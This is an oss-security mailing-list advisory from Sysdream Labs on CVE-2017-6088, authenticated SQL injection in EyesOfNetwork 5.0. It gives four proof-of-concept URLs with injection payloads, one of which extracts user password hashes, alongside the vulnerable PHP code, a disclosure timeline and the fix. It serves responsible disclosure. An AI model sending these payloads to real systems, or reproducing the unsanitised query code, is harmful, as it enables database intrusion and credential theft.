X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6410" "Thursday" "23" "March" "2017" "16:21:15" "+0100" "Sydream Labs" "labs@sysdream.com" "<d5e3d015-3da6-e8ad-c4a2-0f741c4b3467@sysdream.com>" "230" "[oss-security] [CVE-2017-6088] EON 5.0 Multiple SQL Injection" nil nil nil "3" "2017032315:21:15" "[oss-security] [CVE-2017-6088] EON 5.0 Multiple SQL Injection" (number mark "U       labs@sysdrea Mar 23  230/6410  " thread-indent "\"[oss-security] [CVE-2017-6088] EON 5.0 Multiple SQL Injection\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 17716 invoked by uid 550); 23 Mar 2017 15:21:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 17695 invoked from network); 23 Mar 2017 15:21:30 -0000
DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com 11D311A0D4A
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1490282477;
	bh=TRsMdBYWBuf0o7xClFXzNjZqc7OwVFxpeNJDHAbpofc=;
	h=From:Subject:To:Message-ID:Date:MIME-Version:Content-Type;
	b=Gj4bvV7s+zV1Xaa62PYrCTRbtobkO3X5UC6qGs6TU3cw6s4EeQcwosbCkR44b/c4H
	 qkpkPK//snELA8pvsU6HHCUy3rslC+XbKktDUk/2yUwPnwMcteInIalRhjdtEKWHZ/
	 P5L9cwP54ZgzKaHo3qqnG3oJVBzNoSyrObYnnMAY=
From: Sydream Labs <labs@sysdream.com>
To: oss-security@lists.openwall.com
Message-ID: <d5e3d015-3da6-e8ad-c4a2-0f741c4b3467@sysdream.com>
Date: Thu, 23 Mar 2017 16:21:15 +0100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
 Thunderbird/45.8.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="NB9rHpiHFVhcsBvxoCOPGtgGjejJuUkr8"
Subject: [oss-security] [CVE-2017-6088] EON 5.0 Multiple SQL Injection

--NB9rHpiHFVhcsBvxoCOPGtgGjejJuUkr8
Content-Type: multipart/mixed; boundary="84WPGhW89HW1Wh86w23BP9JWV3riVGkti";
 protected-headers="v1"
From: Sydream Labs <labs@sysdream.com>
To: oss-security@lists.openwall.com
Message-ID: <d5e3d015-3da6-e8ad-c4a2-0f741c4b3467@sysdream.com>
Subject: [CVE-2017-6088] EON 5.0 Multiple SQL Injection

--84WPGhW89HW1Wh86w23BP9JWV3riVGkti
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

# [CVE-2017-6088] EON 5.0 Multiple SQL Injection

## Description

EyesOfNetwork ("EON") is an OpenSource network monitoring solution.

## SQL injection (authenticated)

The Eonweb code does not correctly filter arguments, allowing
authenticated users to inject arbitrary SQL requests.

**CVE ID**: CVE-2017-6088

**Access Vector**: remote

**Security Risk**: medium

**Vulnerability**: CWE-89

**CVSS Base Score**: 6.0

**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:L

### Proof of Concept 1 (root privileges)

The following HTTP request allows an attacker (connected as
administrator) to dump the database contents using SQL injections inside
either the `bp_name` or the `display` parameter. These requests are
executed with MySQL root privileges.

```
https://eonweb.local/module/admin_bp/php/function_bp.php?action=3Dlist_proc=
ess&bp_name=3D&display=3D%27or%271%27=3D%271

https://eonweb.local/module/admin_bp/php/function_bp.php?action=3Dlist_proc=
ess&bp_name=3D%27or%271%27=3D%271&display=3D1
```

#### Vulnerable code

The vulnerable code can be found inside the
`module/monitoring_ged/ged_functions.php` file, line 114:

```
function list_process($bp,$display,$bdd){
    $sql =3D "select name from bp where is_define =3D 1 and name!=3D'".$bp.=
"'
and priority =3D '" . $display . "'";
    $req =3D $bdd->query($sql);
    $process =3D $req->fetchall();

    echo json_encode($process);
}
```

### Proof of Concept 2

The following HTTP request allows an attacker to dump the database
contents using SQL injections inside the `type` parameter:

```
https://eonweb.local/module/monitoring_ged/ajax.php?queue=3Dactive&type=3D1=
%27+AND+(SELECT+sleep(5))+AND+%271%27=3D%271&owner=3D&filter=3Dequipment&se=
arch=3D&ok=3Don&warning=3Don&critical=3Don&unknown=3Don&daterange=3D&time_p=
eriod=3D&ack_time=3D
```

#### Vulnerable code

The vulnerable code can be found inside the
`module/monitoring_ged/ajax.php` file, line 64:

```
if($_GET["type"] =3D=3D 0){
  $ged_where =3D "WHERE pkt_type_id!=3D'0'";
} else {
  $ged_where =3D "WHERE pkt_type_id=3D'".$_GET["type"]."'";
}
$gedsql_result1=3Dsqlrequest($database_ged,"SELECT
pkt_type_id,pkt_type_name FROM pkt_type $ged_where AND pkt_type_id<'100';");
```

### Proof of Concept 3

The following HTTP request allows an attacker to dump the database
contents using SQL injections inside the `search` parameter:

```
https://eonweb.local/module/monitoring_ged/ajax.php?queue=3Dactive&type=3D1=
&owner=3D&filter=3Dequipment&search=3D'+AND+(select+sleep(5))+AND+'1'=3D'1&=
ok=3Don&warning=3Don&critical=3Don&unknown=3Don&daterange=3D&time_period=3D=
&ack_time=3D
```


#### Vulnerable code

The vulnerable code can be found inside the
`module/monitoring_ged/ged_functions.php` file, line 129.

```
if($search !=3D ""){
    $like =3D "";
    if( substr($search, 0, 1) =3D=3D=3D '*' ){
        $like .=3D "%";
    }
    $like .=3D trim($search, '*');
    if ( substr($search, -1) =3D=3D=3D '*' ) {
        $like .=3D "%";
    }

    $where_clause .=3D " AND $filter LIKE '$like'";
}
```


### Proof of Concept 4

The following HTTP request allows an attacker to dump the database
contents using SQL injections inside the `equipment` parameter:

```
https://eonweb.local/module/monitoring_ged/ged_actions.php?action=3Dadvance=
dFilterSearch&filter=3D(select+user_passwd+from+eonweb.users+limit
1)&queue=3Dhistory
```


#### Vulnerable code

The vulnerable code can be found inside the
`module/monitoring_ged/ged_functions.php` file, line 493:

```
$gedsql_result1=3Dsqlrequest($database_ged,"SELECT
pkt_type_id,pkt_type_name FROM pkt_type WHERE pkt_type_id!=3D'0' AND
pkt_type_id<'100';");


while($ged_type =3D mysqli_fetch_assoc($gedsql_result1)){
    $sql =3D "SELECT DISTINCT $filter FROM
".$ged_type["pkt_type_name"]."_queue_".$queue;

    $results =3D sqlrequest($database_ged, $sql);
    while($result =3D mysqli_fetch_array($results)){
        if( !in_array($result[$filter], $datas) && $result[$filter] !=3D ""=
 ){
            array_push($datas, $result[$filter]);
        }
    }
}
```


## Timeline (dd/mm/yyyy)

* 01/10/2016 : Initial discovery.
* 09/10/2016 : Fisrt contact with vendor.
* 23/10/2016 : Technical details sent to the security contact.
* 27/10/2016 : Vendor akwnoledgement and first patching attempt.
* 16/02/2017 : New tests done on release candidate 5.1. Fix confirmed.
* 26/02/2017 : 5.1 release. Waiting for 2 weeks according to our
repsonsible disclosure agreement.
* 14/03/2017 : Public disclosure.

Thank you to EON for the fast response.

## Solution

Update to version 5.1.

## Affected versions

* Version <=3D 5.0

## Credits

* Nicolas SERRA <n.serra@sysdream.com>

--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream




--84WPGhW89HW1Wh86w23BP9JWV3riVGkti--

--NB9rHpiHFVhcsBvxoCOPGtgGjejJuUkr8
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIvBAEBCAAZBQJY0+fsEhxsYWJzQHN5c2RyZWFtLmNvbQAKCRCOtIzZ1bJZoRvQ
D/9brShPFFzDTskjoyJKPgMRNzdnOWH6JKBvYkhFcJltzqs7DzeMH4siSpO/86UH
I5KxLWuGATZwf75gQ6TVZ03e4/kPFEpnlL4l/O7jO2vgtgrV9B9Af8iXJdsGG30j
FFp87bZo5J/5qg+zdJBHMkhzPoU6RB9bFUHKgxlNjfEqYQ/ekGW3/4W0Z5khtSq4
hk/8PAGa5pMdKdghidOFrsnF14cLkuRgaSyTtZILdlAYAhIlonwQ4W/xfEhuf1gg
1JWKt9Yx+rmb1s/E+2l5Mf4DEhCTbhdviHw0aEF5BSupCJpLXRRGiwn/HLz9aGnB
S1lclWK0+IyqUTTxC7wTyyXagGSXgBzAe7qguktkmdGKcREkpBDJhIRUHcSZJ+7x
41LHnmiclJBCWriyD6DnfEgCGMG49J7dOWz+APJAQKXZeyW28j9+snlLPTpNAw89
MFEuZQiUepcWD/7ctp1+qQgPwdVsCR/SnNvdALNFHqd8Nuh7ty7iGOiZTFEmO5Fv
TYdUEYI80I+ibUnRVaNDTIR9aE71Qcp0cOHpoL/L0rlxdhf582IlZ0o1c47z9vx1
7Q/8qsPvkeR/Ffzc+uNeVJP3o6VZbl5q6gHfZLljU2n9S9bKffd4kZgADrpkr0bV
196s1rIYb8jedUhd85JNEQrJr+DSiP2lmlYBo8VSCLHe+Q==
=bhV5
-----END PGP SIGNATURE-----

--NB9rHpiHFVhcsBvxoCOPGtgGjejJuUkr8--
